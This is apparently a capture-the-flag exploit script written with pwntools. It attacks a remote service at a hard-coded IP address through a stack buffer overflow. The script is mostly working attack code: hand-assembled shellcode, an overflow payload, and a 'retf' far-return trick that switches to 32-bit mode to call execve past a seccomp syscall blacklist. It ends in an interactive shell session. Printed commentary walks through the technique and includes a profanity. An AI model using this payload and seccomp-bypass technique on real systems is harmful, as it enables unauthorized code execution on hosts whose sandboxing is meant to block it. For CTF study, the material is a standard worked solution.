#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Author : yuan
# https://30cm.ml

context(arch = 'amd64' , os = 'linux')

host = "140.115.59.13"
port = 56746

yuan = remote(host,port)
yuan.recvuntil('x')
ad = yuan.recvuntil('\n')
buf_addr = int(ad , 16)

got = 0x601000
flag = '/home/bofscrev/flag.exe'

m = '\x48\xbb'+'\x23'+'\x00'*7+'\x53'+'\x48\xbb'+p64(got+0x18)+'\x53'+'\x48\xcb' # retf opcodes

m1 = asm("""
    xor rdx,rdx
    mov rdx , 0xa0
    mov rax , 0x0
    mov rdi , 0x0
    pop rsi
    syscall
    xor rdx,rdx
    mov rdx , 0x2c
    mov rax , 0x1
    mov rdi , 0x1
    pop rsi
    syscall
    mov rax , 0x23
    push rax
    mov rax , 0x601018
    push rax
""")

shellcode = m1 + '\x48\xcb'
payload = shellcode

p = payload
p += 'a' * (112 - len(payload))
p += 'RBBBBBBP'
p += p64(buf_addr)
p += p64(got)
p += p64(got)

gg = asm("""
    mov ebx , 0x601000
    xor eax , eax
    mov edx , eax
    mov ecx , eax
    mov eax , 0xb
    int 0x80
""")

print "ççç After using the libseccomp's tools , according to the results the following numbers of syscall are in blacklist: "
print "ççç \t\t\t\t\t\t\t+--------------------+"
print "ççç \t\t\t\t\t\t\t|   2     open       |"
print "ççç \t\t\t\t\t\t\t|   57    fork       |"
print "ççç \t\t\t\t\t\t\t|   58    vfork      |"
print "ççç \t\t\t\t\t\t\t|   59    execve     |"
print "ççç \t\t\t\t\t\t\t|   257   openat     |"
print "ççç \t\t\t\t\t\t\t|   322   execveat   |"
print "ççç \t\t\t\t\t\t\t|   520   execve     |"
print "ççç \t\t\t\t\t\t\t+--------------------+"
print "ççç You can see even the x32-specific system call numbers to avoid cache impact for native 64-bit operation , like 520 , "
print "ççç also in the blaklist !!!!!!! Fuck all . So , we have to find other way of caurse... ,then I searched some vulnerabilities "
print "ççç about bypass seccomp blacklist by using 32bit syscall , how does it work , because in some Linux kernel it can support to "
print "ççç run a 32bit program ,that also explian why in x64 long mode Linux system they still keep some legacy segment register like "
print "ççç fs gs cs ss ds es . As for 32bit syscall execve() , it's number for syscall is 0xb which mean that it's syscall number is 11 and "
print "ççç it is not in seccomp blacklist , but it do the execution action ! In addition , if you execute some instructions or 64bit ELF ,"
print "ççç it may use some syscall in blacklist , so it will still be terminated! , so if you want to go this way , you must to check all"
print "ççç situations are expected."
print
print "ççç First , we know the ELF is 64bit and it's NX is disable , and it also give us the entry point address of buffer which for us to input."
print "ççç And then , we want to switch to 32bit mod so that we can call 32bit syscall , so for the next , we have to write a payload to do this."
print "ççç The payload's first step is to write our 32bit shellcocde to 32bit memory which high 4 bytes of address is 0x0. "
print "ççç The first part of payload I call it m1 , m1 payload is going to use 64bit read() syscall to write our 32bit payload from stdin into 32bit memory , "
print "ççç then I use 64 bit write() syscall to dump the results in memory through stdout for checking, and the memory i writed into is .got because "
print "ççç it's high 8 bytes of address is 0x0."
print "ççç Here is m1 payload:"
print
print "ççç m1 payload ->", m1
print
yuan.sendline(p)
yuan.sendline(flag+'\x00'+gg+'\n')
yuan.recvuntil('~\n')
write = yuan.recvuntil('\n')
yuan.recvuntil('\n')
print "ççç And the dumping results of memory in .got:"
print "ççç ", hex(got) ,'->' ,write
print
print "ççç It's our 32bit payload ->" , write
print "ççç You can see the 32bit payload is composed of the data and the 32bit shellcode."
print
print "ççç data_parameters ->", flag
print "ççç 32bit shellcode ->", gg
print
print "ççç So , we already wrote 32bit payload to 32bit memory , next step is the most important step !"
print "ççç How to switch to 32bit mode in 64bit long mode ? After reading a large number of books and articles form the web , the key point is CS segment"
print "ççç registor , you have to override it with 0x33 for x64 , 0x23 for x86 , which meaning some Segment Selector ."
print "ççç Then I found the 'retf' instruction which opcode is '0xcb' , it do the things that pop IP/EIP first then pop CS , but you can't directively  use it "
print "ççç in 64bit long mode , it would occur some errors. After searching some articles , you can use it in 64bit long mode with prefix '0x48'."
print "ççç So the next part of payload is m payload , which do the things that push 0x23 and the 32bit address of our 32bit shellcode , than execute retf instruction"
print "ççç to pop tham into RIP and override the CS with 0x23 ."
print "ççç Here is the m payload:"
print
print "ççç m payload ->", m
print
print "ççç payload ->" , p
print
print "ççç The result of m payload is that we switch to 32bit mode and it's eip is going to run our 32bit shellcode program !!!"
print "ççç With the data and parameters I already set in the front of 32bit payload , the 32bit shellcode will call the 32bit syscall to execute the 32bit program !!! "
print
print "ççç OK OK Here is the flag ~"
print
yuan.interactive()
